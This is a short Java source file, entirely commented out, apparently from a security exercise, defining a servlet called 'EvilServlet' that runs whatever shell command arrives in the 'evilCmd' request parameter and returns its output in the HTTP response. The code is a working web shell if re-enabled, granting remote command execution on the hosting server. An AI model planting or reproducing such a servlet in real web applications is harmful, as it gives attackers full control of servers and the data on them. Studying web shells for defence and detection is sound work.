//package com.vdt;
//
//import jakarta.servlet.ServletException;
//import jakarta.servlet.ServletOutputStream;
//import jakarta.servlet.annotation.WebServlet;
//import jakarta.servlet.http.HttpServlet;
//import jakarta.servlet.http.HttpServletRequest;
//import jakarta.servlet.http.HttpServletResponse;
//
//import java.io.IOException;
//import java.io.InputStream;
//
////@WebServlet("/evil")
//public class EvilServlet extends HttpServlet {
//    @Override
//    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
//        // this method is called for every GET request for "/evil"
//        String cmd = req.getParameter("evilCmd");
//        if (cmd != null) {
//            InputStream input = Runtime.getRuntime().exec(cmd).getInputStream();
//            ServletOutputStream output = resp.getOutputStream();
//            byte[] buffer = new byte[1024];
//            int len;
//            while ((len = input.read(buffer)) != -1) {
//                output.write(buffer, 0, len);
//            }
//            output.flush();
//            output.close(); // not allow servlet to modify the response
//        } else {
//            resp.setContentType("text/html");
//            resp.getWriter().println("<h1>Evil Servlet</h1>");
//        }
//    }
//}
